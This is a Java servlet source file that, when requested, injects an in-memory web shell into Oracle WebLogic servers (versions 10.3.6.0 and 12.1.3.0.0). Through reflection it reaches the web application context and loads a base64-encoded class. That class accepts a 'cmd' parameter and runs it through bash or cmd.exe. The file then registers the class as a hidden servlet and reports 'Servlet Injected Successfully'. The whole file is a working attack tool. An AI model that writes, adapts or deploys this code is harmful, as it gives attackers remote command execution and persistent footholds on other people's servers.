import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.WebAppServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class addServlet extends HttpServlet {
    public void init() {
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method getCurrentWork = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = getCurrentWork.invoke(Thread.currentThread());
            WebAppServletContext webAppServletContext;
            try {
                // weblogic 12.1.3.0.0
                Field connectionHandler = currentWork.getClass().getDeclaredField("connectionHandler");
                connectionHandler.setAccessible(true);
                Object httpConnectionHandler = connectionHandler.get(currentWork);
                Field requestF = httpConnectionHandler.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                httpConnectionHandler = requestF.get(httpConnectionHandler);
                java.lang.reflect.Field contextF = httpConnectionHandler.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                webAppServletContext = (WebAppServletContext) contextF.get(httpConnectionHandler);
            } catch (Exception e) {
                // weblogic 10.3.6.0
                Field contextF = currentWork.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                webAppServletContext = (WebAppServletContext) contextF.get(currentWork);
            }
            byte[] evilClassBytes = new BASE64Decoder().decodeBuffer("yv66vgAAADIAhQoAHQBCCAArCwBDAEQIAEUKAEYARwoACQBICABJCgAJAEoHAEsIAEwIAE0IAE4IAE8KAFAAUQoAUABSCgBTAFQHAFUKABEAVggAVwoAEQBYCgARAFkKABEAWggAWwsAXABdCgBeAF8KAF4AYAoAXgBhBwBiBwBjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMY29tL2V4YW1wbGUvd2VibG9naWMxMDM2L2NtZFNlcnZsZXQ7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcASwcAMQcAZAcAVQEACkV4Y2VwdGlvbnMHAGUBAApTb3VyY2VGaWxlAQAkY21kU2VydmxldC5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAeAB8HAGYMAGcAaAEAB29zLm5hbWUHAGkMAGoAaAwAawBsAQADd2luDABtAG4BABBqYXZhL2xhbmcvU3RyaW5nAQAEYmFzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwBvDABwAHEMAHIAcwcAdAwAdQB2AQARamF2YS91dGlsL1NjYW5uZXIMAB4AdwEAAlxhDAB4AHkMAHoAewwAfABsAQAABwB9DAB+AH8HAIAMAIEAggwAgwAfDACEAB8BACNjb20vZXhhbXBsZS93ZWJsb2dpYzEwMzYvY21kU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAcAB0AAAAAAAIAAQAeAB8AAQAgAAAAMwABAAEAAAAFKrcAAbEAAAACACEAAAAKAAIAAAAMAAQADQAiAAAADAABAAAABQAjACQAAAAEACUAJgACACAAAAGKAAQACwAAAKErEgK5AAMCAE4ENgQSBLgABToFGQXGABMZBbYABhIHtgAImQAGAzYEFQSZABgGvQAJWQMSClNZBBILU1kFLVOnABUGvQAJWQMSDFNZBBINU1kFLVM6BrgADhkGtgAPtgAQOge7ABFZGQe3ABISE7YAFDoIGQi2ABWZAAsZCLYAFqcABRIXOgksuQAYAQA6ChkKGQm2ABkZCrYAGhkKtgAbsQAAAAMAIQAAADoADgAAABAACQARAAwAEgATABMAJQAUACgAFwBWABgAYwAZAHMAGgCHABsAjwAcAJYAHQCbAB4AoAAfACIAAABwAAsAAAChACMAJAAAAAAAoQAnACgAAQAAAKEAKQAqAAIACQCYACsALAADAAwAlQAtAC4ABAATAI4ALwAsAAUAVgBLADAAMQAGAGMAPgAyADMABwBzAC4ANAA1AAgAhwAaADYALAAJAI8AEgA3ADgACgA5AAAAIQAF/gAoBwA6AQcAOhlRBwA7/gAuBwA7BwA8BwA9QQcAOgA+AAAABAABAD8AAQBAAAAAAgBB");
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);

            // 获取webAppServletContext中的classLoader
            Field classLoaderF = webAppServletContext.getClass().getDeclaredField("classLoader");
            classLoaderF.setAccessible(true);
            ClassLoader classLoader = (ClassLoader) classLoaderF.get(webAppServletContext);
            Class servletClass = (Class) defineClass.invoke(classLoader, evilClassBytes, 0, evilClassBytes.length);

            try {
                // weblogic 12.1.3.0.0
                Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class);
                registerServlet.setAccessible(true);
                registerServlet.invoke(webAppServletContext, "TestServlet", "/121300", servletClass.getName());
                response.getWriter().write("12.1.3.0.0 Servlet Injected Successfully!!!");
            }catch (Exception e) {
                // weblogic 10.3.6.0
                Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class, Map.class);
                registerServlet.setAccessible(true);
                HashMap hashMap = new HashMap();
                registerServlet.invoke(webAppServletContext, "TestServlet", "/10360", servletClass.getName(), hashMap);
                response.getWriter().write("10.3.6.0 Servlet Injected Successfully!!!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void destroy() {
    }

}